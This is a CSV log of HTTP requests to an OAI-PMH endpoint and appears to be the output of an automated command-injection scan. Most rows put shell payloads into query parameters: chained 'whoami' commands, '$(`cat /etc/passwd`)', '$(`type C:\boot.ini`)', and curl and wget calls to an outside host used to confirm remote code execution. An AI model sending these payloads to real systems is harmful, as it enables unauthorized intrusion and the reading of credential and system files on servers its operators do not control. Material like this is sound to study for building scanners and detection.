uuid,timestamp,http_status_code,request_url,response_time,http_version
0c90f758-927e-4fac-9f66-5ea39af460ea,2025-01-01 15:38:53,200,http://islandora.io/oai/request?verb=%22,52.56 ms,HTTP/1.1
3e2910e5-4bdf-4f28-8afe-c84a292d2deb,2025-01-01 15:38:53,200,http://islandora.io/oai/request?verb=ListMetadataFormats,64.07 ms,HTTP/1.1
b1841501-57e6-4fb1-8309-fec1c56c5ee3,2025-01-01 15:38:53,200,http://islandora.io/oai/request?verb=ListSets,58.12 ms,HTTP/1.1
c7bf7efe-caaa-432e-896e-5d0f65090c3f,2025-01-01 15:38:54,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%22&set=%22,55.12 ms,HTTP/1.1
b0f3a9ed-4ac8-483d-82c2-ca85d00320e3,2025-01-01 15:38:54,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%22,35.75 ms,HTTP/1.1
a2bfa158-da9f-4a3f-8c5d-6e566a170cc9,2025-01-01 15:38:55,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%22&metadataPrefix=oai_dc,37.13 ms,HTTP/1.1
0c8ea81c-4071-46c3-9cc6-76e074911fd1,2025-01-01 15:38:55,200,http://islandora.io/oai/request?verb=%22+%26+whoami,60.13 ms,HTTP/1.1
da9d7477-46ce-4951-91a2-7ef104137cda,2025-01-01 15:38:55,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%22+%26+whoami,51.94 ms,HTTP/1.1
d618b222-7550-45bd-8154-bb677633890f,2025-01-01 15:38:56,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%22+%26+whoami,60.04 ms,HTTP/1.1
f95cab17-9288-467f-a820-bb98ae19e864,2025-01-01 15:38:56,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%22+%26+whoami&until=%22+%26+whoami,57.62 ms,HTTP/1.1
3035e84d-0ab8-4ac1-b913-cc6e161ebce8,2025-01-01 15:38:56,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%22+%26+whoami&set=%22+%26+whoami,66.37 ms,HTTP/1.1
927486a3-ec7d-4dbf-a771-224474982c62,2025-01-01 15:38:57,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%22+%26+whoami&metadataPrefix=oai_dc,34.50 ms,HTTP/1.1
cf0b3479-989c-426c-8a9b-b33b942e7243,2025-01-01 15:38:57,200,http://islandora.io/oai/request?verb=%22+%26%26+whoami,48.84 ms,HTTP/1.1
56230845-2209-4a69-9995-c329487acff7,2025-01-01 15:38:57,200,http://islandora.io/oai/request?verb=ListMetadataFormats,52.91 ms,HTTP/1.1
1909dfd3-4879-4e87-8229-2b4eaf266ddf,2025-01-01 15:38:58,200,http://islandora.io/oai/request?verb=ListSets,63.06 ms,HTTP/1.1
bc7cf570-e477-4bb3-8c84-252741fab25c,2025-01-01 15:38:58,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%22+%26%26+whoami,59.74 ms,HTTP/1.1
5267b7eb-2105-4ce6-bf7f-15ea23ece6de,2025-01-01 15:38:59,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc,150.64 ms,HTTP/1.1
dacbb918-974f-4a34-8ff3-3964d92ad067,2025-01-01 15:38:59,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%22+%26%26+whoami&metadataPrefix=marc,64.23 ms,HTTP/1.1
ef71a622-e1ae-4dd9-9028-232ec3db51b2,2025-01-01 15:38:59,200,http://islandora.io/oai/request?verb=%22+whoami,62.05 ms,HTTP/1.1
a96d7876-fc85-4607-83fc-7d67ad20c2dc,2025-01-01 15:39:00,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%22+whoami,55.36 ms,HTTP/1.1
057d3d2b-c326-4a43-83b8-d3d6d7d05ce4,2025-01-01 15:39:00,200,http://islandora.io/oai/request?verb=ListSets,32.51 ms,HTTP/1.1
49416cfa-5c6e-4ab1-bafa-3adc3c53309a,2025-01-01 15:39:00,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%22+whoami,53.84 ms,HTTP/1.1
de20ecfe-5a23-431e-9947-453998f2e45c,2025-01-01 15:39:01,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&set=%22+whoami,56.09 ms,HTTP/1.1
966932c0-4e3c-4bca-946e-0d1a9e0cf26d,2025-01-01 15:39:01,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%22+whoami&metadataPrefix=marc,38.01 ms,HTTP/1.1
39038b23-e9d7-4b07-a97a-3f00bb828131,2025-01-01 15:39:01,200,http://islandora.io/oai/request?verb=%22+%7C+whoami,66.59 ms,HTTP/1.1
912fd27d-37b2-47a3-9d9d-f64e26c3e83f,2025-01-01 15:39:02,200,http://islandora.io/oai/request?verb=ListMetadataFormats,52.02 ms,HTTP/1.1
e27e8839-5caa-4a93-aec9-e21b3092b1ba,2025-01-01 15:39:02,200,http://islandora.io/oai/request?verb=ListSets,42.07 ms,HTTP/1.1
4240602b-c704-4317-aaa6-c31293eb351b,2025-01-01 15:39:02,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%22+%7C+whoami&until=%22+%7C+whoami,65.25 ms,HTTP/1.1
d545fd06-7424-47aa-9878-c47814a5c599,2025-01-01 15:39:03,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%22+%7C+whoami,42.55 ms,HTTP/1.1
90deb478-8f6c-47da-bb68-16a93603e19f,2025-01-01 15:39:03,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%22+%7C+whoami&metadataPrefix=marc,37.28 ms,HTTP/1.1
71b61232-91f9-49cd-ad89-7a30a0056760,2025-01-01 15:39:04,200,http://islandora.io/oai/request?verb=%22+%7C%7C+whoami,54.53 ms,HTTP/1.1
7575246b-80ed-4bcf-b0ae-e14148f54edb,2025-01-01 15:39:04,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%22+%7C%7C+whoami,55.24 ms,HTTP/1.1
223467d6-dac5-49e5-9ae5-62ec8383c1b4,2025-01-01 15:39:04,200,http://islandora.io/oai/request?verb=ListSets,49.40 ms,HTTP/1.1
bb6144d3-54ee-4d2a-9458-46b533bb52d2,2025-01-01 15:39:05,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,59.43 ms,HTTP/1.1
0e0f1619-f4fa-4db5-bef6-4dbd36660973,2025-01-01 15:39:05,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc,125.18 ms,HTTP/1.1
57deff34-2809-477d-abec-f356a643fd16,2025-01-01 15:39:06,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%22+%7C%7C+whoami&metadataPrefix=oai_dc,35.05 ms,HTTP/1.1
218b93d5-60e3-4232-ad0e-5f9b093af46a,2025-01-01 15:39:06,200,http://islandora.io/oai/request?verb=%22%27,51.71 ms,HTTP/1.1
c712943f-1966-433a-a0fb-d05227420f8a,2025-01-01 15:39:06,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%22%27,61.86 ms,HTTP/1.1
9644c762-9f13-41c7-8bfe-b8f32f93fb01,2025-01-01 15:39:07,200,http://islandora.io/oai/request?verb=ListSets,32.61 ms,HTTP/1.1
1689ea68-b4f8-43e0-96b3-cdb4094afc7c,2025-01-01 15:39:07,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%22%27&set=%22%27,54.83 ms,HTTP/1.1
1bdf13df-030c-4197-b9ae-89da4f96b19b,2025-01-01 15:39:07,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%22%27&set=%22%27,53.52 ms,HTTP/1.1
5c992701-026d-46d9-8df3-787441d7eec2,2025-01-01 15:39:08,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%22%27&metadataPrefix=marc,36.48 ms,HTTP/1.1
3b356a0f-4a50-433e-b00b-0d0e727f7ed4,2025-01-01 15:39:08,200,http://islandora.io/oai/request?verb=%22%3B+whoami,49.41 ms,HTTP/1.1
49fca009-d0c4-4ba6-b716-7465cbff4591,2025-01-01 15:39:08,200,http://islandora.io/oai/request?verb=ListMetadataFormats,54.26 ms,HTTP/1.1
f66a991d-902e-4318-b40e-c2405a55f081,2025-01-01 15:39:09,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%22%3B+whoami,53.38 ms,HTTP/1.1
20487e57-495d-4c14-9c8a-aa604f93f2d0,2025-01-01 15:39:09,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,43.06 ms,HTTP/1.1
29d1d201-be42-47cc-9f1d-7f7ba6c2c245,2025-01-01 15:39:09,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%22%3B+whoami&until=%22%3B+whoami&set=%22%3B+whoami,58.81 ms,HTTP/1.1
bfe42211-cba9-4a24-b6e9-7148235ab2ca,2025-01-01 15:39:10,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%22%3B+whoami&metadataPrefix=marc,44.21 ms,HTTP/1.1
2ad84f42-69cc-4958-9184-340a9e70c2f8,2025-01-01 15:39:10,200,http://islandora.io/oai/request?verb=%24%28%60cat+%2Fetc%2Fpasswd%60%29,53.21 ms,HTTP/1.1
b5335d4a-c6f5-41c1-8c10-ef62abea834d,2025-01-01 15:39:10,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%24%28%60cat+%2Fetc%2Fpasswd%60%29,53.65 ms,HTTP/1.1
6322f4ef-8726-4a28-9cba-94e3c42c5972,2025-01-01 15:39:11,200,http://islandora.io/oai/request?verb=ListSets,54.40 ms,HTTP/1.1
c05a18a6-2448-4784-884b-862af94be1b5,2025-01-01 15:39:11,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%24%28%60cat+%2Fetc%2Fpasswd%60%29&set=%24%28%60cat+%2Fetc%2Fpasswd%60%29,68.03 ms,HTTP/1.1
fabd0de1-fc13-4519-86a3-66ce14e4bedb,2025-01-01 15:39:11,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%24%28%60cat+%2Fetc%2Fpasswd%60%29,56.39 ms,HTTP/1.1
694d141c-689d-4ecb-b53a-fe963e5abc2b,2025-01-01 15:39:12,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60cat+%2Fetc%2Fpasswd%60%29&metadataPrefix=oai_dc,53.15 ms,HTTP/1.1
87ea2b6c-ca81-41dc-b1ec-b2e8a2597926,2025-01-01 15:39:12,200,http://islandora.io/oai/request?verb=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,36.20 ms,HTTP/1.1
0f1632ef-f53d-4e9a-93da-fcad65badea9,2025-01-01 15:39:12,200,http://islandora.io/oai/request?verb=ListMetadataFormats,49.30 ms,HTTP/1.1
945f36f8-f85f-438e-8ba0-3472d5af052c,2025-01-01 15:39:13,200,http://islandora.io/oai/request?verb=ListSets,49.39 ms,HTTP/1.1
fd4a4510-5298-43df-8304-0ae0c6eeef38,2025-01-01 15:39:13,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&set=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,56.09 ms,HTTP/1.1
8ac5a4f5-a915-4c34-ab5d-d9bb76732943,2025-01-01 15:39:13,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&set=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,57.45 ms,HTTP/1.1
1907c4b7-e8fd-443b-bece-73ef1f0620aa,2025-01-01 15:39:14,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&metadataPrefix=oai_dc,36.13 ms,HTTP/1.1
b3ac955e-882b-4b7c-bbb0-c83590600d1e,2025-01-01 15:39:14,200,http://islandora.io/oai/request?verb=%24%28%60dir%60%29,41.72 ms,HTTP/1.1
c196b44c-1bfa-40c3-852a-a2ea2462d6f3,2025-01-01 15:39:14,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%24%28%60dir%60%29,58.11 ms,HTTP/1.1
0aa4d944-35c1-4fa6-96a3-9ef728817c01,2025-01-01 15:39:15,200,http://islandora.io/oai/request?verb=ListSets,42.93 ms,HTTP/1.1
d173129b-27cb-471f-9557-1cfa8c12c457,2025-01-01 15:39:15,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%24%28%60dir%60%29&set=%24%28%60dir%60%29,47.09 ms,HTTP/1.1
5ad57d1c-efc8-4111-a6df-552a310621ef,2025-01-01 15:39:15,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%24%28%60dir%60%29&until=%24%28%60dir%60%29,60.36 ms,HTTP/1.1
bd0d0396-a758-425d-b29c-b5396052ff19,2025-01-01 15:39:16,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60dir%60%29&metadataPrefix=oai_dc,58.39 ms,HTTP/1.1
decc3f88-1b2c-48a7-a17d-9b9e7641b946,2025-01-01 15:39:16,200,http://islandora.io/oai/request?verb=%24%28%60ls%60%29,56.06 ms,HTTP/1.1
0f87f43a-d058-4e02-9126-68107f884b16,2025-01-01 15:39:16,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%24%28%60ls%60%29,43.55 ms,HTTP/1.1
a5ccf065-e77e-44b8-bd10-b802eb1b4dc3,2025-01-01 15:39:17,200,http://islandora.io/oai/request?verb=ListSets,47.05 ms,HTTP/1.1
18d49343-aa3a-4470-8c02-fcf0e7c424b4,2025-01-01 15:39:17,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%24%28%60ls%60%29,59.78 ms,HTTP/1.1
9e6aa1b8-bd4d-41d9-b62e-a3b28635f369,2025-01-01 15:39:18,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%24%28%60ls%60%29,54.40 ms,HTTP/1.1
5f85f2fa-c2c4-4e9f-99f8-7e272ffc440f,2025-01-01 15:39:18,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60ls%60%29&metadataPrefix=marc,55.97 ms,HTTP/1.1
0f70790a-f54d-4b17-8086-2c5ad75fcee7,2025-01-01 15:39:18,200,http://islandora.io/oai/request?verb=%24%28%60type+C%3A%5Cboot.ini%60%29,47.47 ms,HTTP/1.1
ca07e0e3-ff46-4077-bbd8-91fd6557b589,2025-01-01 15:39:19,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%24%28%60type+C%3A%5Cboot.ini%60%29,64.06 ms,HTTP/1.1
93aa2f98-297f-4cb6-bc4a-2e3db938f5db,2025-01-01 15:39:19,200,http://islandora.io/oai/request?verb=ListSets,47.81 ms,HTTP/1.1
918b0262-f630-450f-b145-3aa7d53677f8,2025-01-01 15:39:19,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%24%28%60type+C%3A%5Cboot.ini%60%29,53.83 ms,HTTP/1.1
d141d121-7dbf-4f66-a24a-7f89de8f3318,2025-01-01 15:39:20,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%24%28%60type+C%3A%5Cboot.ini%60%29&set=%24%28%60type+C%3A%5Cboot.ini%60%29,43.08 ms,HTTP/1.1
cd433811-9421-4c0d-8bdc-54cf4ecfbcae,2025-01-01 15:39:20,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60type+C%3A%5Cboot.ini%60%29&metadataPrefix=marc,64.28 ms,HTTP/1.1
e7d733a6-e7c8-4ed8-a4fa-0043eb180fb3,2025-01-01 15:39:20,200,http://islandora.io/oai/request?verb=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,58.64 ms,HTTP/1.1
4a209058-3fca-4512-be70-7e4c332e7508,2025-01-01 15:39:21,200,http://islandora.io/oai/request?verb=ListMetadataFormats,53.24 ms,HTTP/1.1
0cf1cc86-b276-4af0-9425-fffa5c9f3827,2025-01-01 15:39:21,200,http://islandora.io/oai/request?verb=ListSets,44.30 ms,HTTP/1.1
819045e1-7e30-4968-8619-933c17cdca28,2025-01-01 15:39:21,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,50.56 ms,HTTP/1.1
